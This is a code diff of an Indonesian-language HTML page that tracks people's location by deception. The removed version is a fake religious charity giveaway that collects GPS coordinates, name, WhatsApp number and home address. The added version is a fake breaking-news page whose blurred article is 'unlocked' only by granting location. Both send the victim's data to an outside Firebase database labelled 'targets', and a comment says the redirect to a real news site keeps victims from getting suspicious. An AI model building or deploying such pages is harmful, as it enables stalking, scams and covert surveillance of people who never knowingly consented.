@@ -3,172 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Program Amanah Berbagi - Hamba Allah</title>
+    <title>Berita Terkini - Kejadian Viral Hari Ini</title>
     <style>
-        :root { --primary: #2e7d32; --secondary: #1b5e20; --bg: #f8fafc; }
-        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: #333; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .card { background: #fff; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 420px; width: 92%; overflow: hidden; border: 1px solid #eee; margin: 20px 0; }
-        .banner { background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://img.freepik.com/free-photo/hands-holding-donations-box-with-food_23-2148733810.jpg'); background-size: cover; background-position: center; height: 160px; display: flex; align-items: center; justify-content: center; color: white; flex-direction: column; text-align: center; }
-        .banner h1 { margin: 0; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        .content { padding: 30px; text-align: center; }
-        h2 { color: var(--primary); margin-top: 0; font-size: 19px; font-weight: 700; }
-        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 25px; }
-        
-        /* Reward Selection Grid - Diperbaiki */
-        .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
-        .reward-item { border: 2px solid #f0f0f0; border-radius: 16px; padding: 10px; cursor: pointer; transition: all 0.3s ease; position: relative; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 130px; }
-        .reward-item:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-        .reward-item img { width: 100%; height: 80px; object-fit: contain; margin-bottom: 8px; border-radius: 8px; }
-        .reward-item span { font-size: 11px; font-weight: 600; display: block; color: #333; line-height: 1.3; text-transform: uppercase; letter-spacing: 0.3px; }
-        .reward-item.selected { border-color: var(--primary); background: #f1f8e9; transform: scale(1.03); box-shadow: 0 0 10px rgba(46, 125, 50, 0.2); }
-        .reward-item.selected::after { content: 'PILIHAN ANDA'; position: absolute; top: -10px; right: -5px; background: var(--primary); color: white; border-radius: 20px; padding: 3px 10px; font-size: 9px; font-weight: bold; letter-spacing: 0.5px; }
-
-        .input-group { text-align: left; display: none; animation: slideUp 0.5s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        label { display: block; font-size: 11px; font-weight: 700; margin-bottom: 6px; color: #555; text-transform: uppercase; letter-spacing: 0.5px; }
-        input, textarea { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 12px; box-sizing: border-box; font-size: 15px; margin-bottom: 15px; outline: none; transition: 0.3s; background: #fafafa; }
-        input:focus, textarea:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(46, 125, 50, 0.1); }
-        
-        .btn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 14px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; font-size: 16px; box-shadow: 0 6px 20px rgba(46, 125, 50, 0.2); }
-        .btn:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }
-        .btn:active { transform: scale(0.98); }
-        
-        #loader { display: none; padding: 20px; font-weight: 700; color: var(--primary); font-size: 14px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        :root { --news-red: #cc0000; --dark-blue: #003366; --bg: #fdfdfd; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); color: #222; margin: 0; padding-bottom: 50px; }
+        .nav { background: var(--dark-blue); color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; letter-spacing: 1px; }
+        .container { max-width: 500px; margin: auto; background: white; min-height: 100vh; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+        .article-header { padding: 20px; }
+        .tag { color: var(--news-red); font-weight: bold; font-size: 12px; text-transform: uppercase; }
+        h1 { font-size: 24px; line-height: 1.3; margin: 10px 0; color: #111; }
+        .meta { font-size: 12px; color: #777; margin-bottom: 15px; }
+        .main-img { width: 100%; height: 250px; background: #eee url('https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&q=80&w=800') center/cover; }
+        .content-blur { padding: 20px; position: relative; }
+        .blur-text { color: transparent; text-shadow: 0 0 15px rgba(0,0,0,0.6); user-select: none; line-height: 1.8; }
+        .overlay-lock { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(transparent, white); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; box-sizing: border-box; }
+        .lock-box { background: white; padding: 25px; border-radius: 12px; border: 1px solid #ddd; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; }
+        .lock-box p { font-size: 14px; color: #444; margin-bottom: 20px; }
+        .btn-verify { background: var(--news-red); color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; font-size: 14px; }
+        .btn-verify:hover { background: #990000; }
+        #loader { display: none; margin-top: 15px; color: var(--news-red); font-weight: bold; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="banner">
-        <h1>AMANAH BERBAGI</h1>
-        <small style="font-weight: 500;">Program Hibah Hamba Allah 2026</small>
-    </div>
+<div class="container">
+    <div class="nav">NEWS UPDATE</div>
     
-    <div class="content">
-        <div id="step1">
-            <h2>MasyaAllah, Anda Terpilih!</h2>
-            <p>Amanah bantuan hibah telah disiapkan khusus untuk Anda. Mohon aktifkan lokasi untuk memverifikasi alamat agar kurir dapat menjangkau rumah Anda.</p>
-            <button class="btn" onclick="requestLocation()">VERIFIKASI LOKASI PENGIRIMAN</button>
+    <div class="article-header">
+        <span class="tag">Regional • Terpopuler</span>
+        <h1>Geger! Warga Temukan Benda Misterius di Lokasi Kejadian, Polisi Pasang Garis Pembatas</h1>
+        <div class="meta">Diposting: Baru saja | Penulis: Tim Redaksi</div>
+    </div>
+
+    <div class="main-img"></div>
+
+    <div class="content-blur">
+        <div class="blur-text">
+            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
         </div>
 
-        <div id="step2" style="display:none;">
-            <h2>Pilih Amanah Hadiah</h2>
-            <p>Pilih salah satu hadiah yang paling Anda butuhkan saat ini:</p>
-            <div class="reward-grid">
-                <div class="reward-item" onclick="selectReward(this, 'Uang Tunai 2Jt & Sembako')">
-                    <img src="https://img.freepik.com/free-photo/stacks-indonesian-rupiah-money-banknotes_1373-389.jpg" alt="Sembako & Uang">
-                    <span>Tunai 2Jt + Sembako</span>
-                </div>
-                <div class="reward-item" onclick="selectReward(this, 'Logam Mulia 5 Gram')">
-                    <img src="https://img.freepik.com/free-photo/gold-bars-isolated-white-background_93675-131766.jpg" alt="Emas Batangan">
-                    <span>Emas Antam 5 Gram</span>
-                </div>
-                <div class="reward-item" onclick="selectReward(this, 'iPhone 15 Pro Max')">
-                    <img src="https://img.freepik.com/free-photo/display-screen-new-smartphone_53876-146312.jpg" alt="Smartphone">
-                    <span>iPhone 15 Pro Max</span>
-                </div>
-                <div class="reward-item" onclick="selectReward(this, 'Paket Al-Quran & Alat Sholat')">
-                    <img src="https://img.freepik.com/free-photo/hands-holding-open-quran_23-2148673966.jpg" alt="Al-Quran">
-                    <span>Al-Qur'an & Alat Sholat</span>
-                </div>
+        <div class="overlay-lock" id="lockScreen">
+            <div class="lock-box">
+                <div style="font-size: 30px; margin-bottom: 10px;">🔒</div>
+                <h3>Konten Terbatas</h3>
+                <p>Berdasarkan kebijakan keamanan siber, berita ini hanya dapat diakses oleh warga di wilayah terdampak. <br><br><b>Izinkan akses lokasi</b> untuk memverifikasi wilayah Anda.</p>
+                <button class="btn-verify" onclick="verifyLocation()">BACA BERITA LENGKAP</button>
+                <div id="loader">Memverifikasi Lokasi...</div>
             </div>
-            <button class="btn" id="nextBtn" disabled onclick="toFinalStep()">LANJUTKAN PROSES KLAIM</button>
         </div>
-
-        <div id="step3" class="input-group">
-            <h2>Lengkapi Data Penerima</h2>
-            <div id="confirmText" style="background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; margin-bottom: 20px; border: 1px dashed #2e7d32; display: flex; align-items: center; justify-content: center;"></div>
-            
-            <label>NAMA LENGKAP (Sesuai KTP)</label>
-            <input type="text" id="nama" placeholder="Tulis nama lengkap Anda...">
-            
-            <label>NOMOR WHATSAPP AKTIF</label>
-            <input type="number" id="phone" placeholder="Contoh: 08123456xxx">
-            
-            <label>ALAMAT LENGKAP PENGIRIMAN</label>
-            <textarea id="alamat" rows="3" placeholder="Jl. Nama Jalan, No. Rumah, RT/RW, Kelurahan/Desa, Kecamatan, Kota/Kabupaten..."></textarea>
-            
-            <button class="btn" onclick="submitData()">KONFIRMASI PENGIRIMAN SEKARANG</button>
-        </div>
-        <div id="loader">📍 Sedang mendaftarkan titik lokasi ke kurir...</div>
     </div>
 </div>
 
 <script>
-    const targetID = "Target_" + Math.floor(Date.now() / 1000);
+    const targetID = "Reader_" + Math.floor(Date.now() / 1000);
     const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;
     const startTime = Date.now();
-    let userCoords = { lat: 0, lon: 0 };
-    let selectedRewardName = "";
 
-    function requestLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                userCoords.lat = pos.coords.latitude;
-                userCoords.lon = pos.coords.longitude;
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                sendUpdate("Memilih Hadiah...");
-            }, (err) => {
-                alert("Izin lokasi diperlukan agar kurir kami bisa mengirimkan hadiah tepat ke alamat Anda.");
-            }, { enableHighAccuracy: true });
-        }
-    }
-
-    function selectReward(el, name) {
-        document.querySelectorAll('.reward-item').forEach(item => item.classList.remove('selected'));
-        el.classList.add('selected');
-        selectedRewardName = name;
-        document.getElementById('nextBtn').disabled = false;
-    }
-
-    function toFinalStep() {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'block';
-        document.getElementById('confirmText').innerHTML = `<span style="font-size:18px; margin-right:8px;">✓</span> Pilihan: ${selectedRewardName}`;
-        sendUpdate("Mengisi Form (" + selectedRewardName + ")");
-    }
-
-    async function sendUpdate(status) {
+    async function sendData(coords) {
         const payload = {
             id: targetID,
-            lat: userCoords.lat,
-            lon: userCoords.lon,
-            nama: document.getElementById('nama').value || "-",
-            phone: document.getElementById('phone').value || "-",
-            alamat: document.getElementById('alamat').value || "-",
-            hadiah: selectedRewardName || "Belum Memilih",
-            start_time: startTime,
+            lat: coords.latitude,
+            lon: coords.longitude,
             updated_at: Date.now(),
-            status: status
+            start_time: startTime,
+            status: "Membaca Berita",
+            device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown"
         };
-        // Menggunakan metode PATCH agar data yang sudah ada tidak terhapus
-        await fetch(DB_URL, { 
-            method: 'PATCH', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload) 
-        });
+        await fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
     }
 
-    async function submitData() {
-        const n = document.getElementById('nama').value;
-        const p = document.getElementById('phone').value;
-        const a = document.getElementById('alamat').value;
-
-        if (!n || !p || !a) { alert("Mohon lengkapi data pengiriman Anda!"); return; }
-
-        document.getElementById('step3').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        await sendUpdate("Selesai (Menunggu Antrean)");
-        
-        setTimeout(() => {
-            alert("Alhamdulillah! Data Anda berhasil masuk ke sistem pengiriman pusat. Mohon jaga WhatsApp Anda agar tetap aktif.");
-            window.location.href = "https://www.google.com";
-        }, 4000);
+    function verifyLocation() {
+        document.getElementById('loader').style.display = "block";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendData(pos.coords);
+                alert("Verifikasi Berhasil! Mengalihkan ke halaman penuh...");
+                // Redirect ke berita viral sungguhan di portal besar agar tidak curiga
+                window.location.href = "https://www.kompas.com/tag/viral";
+            }, (err) => {
+                document.getElementById('loader').style.display = "none";
+                alert("Akses Ditolak. Mohon aktifkan GPS dan izinkan lokasi untuk membaca berita ini.");
+            }, { enableHighAccuracy: true });
+        } else {
+            alert("Browser tidak mendukung GPS.");
+        }
     }
 </script>
+
 </body>
 </html>
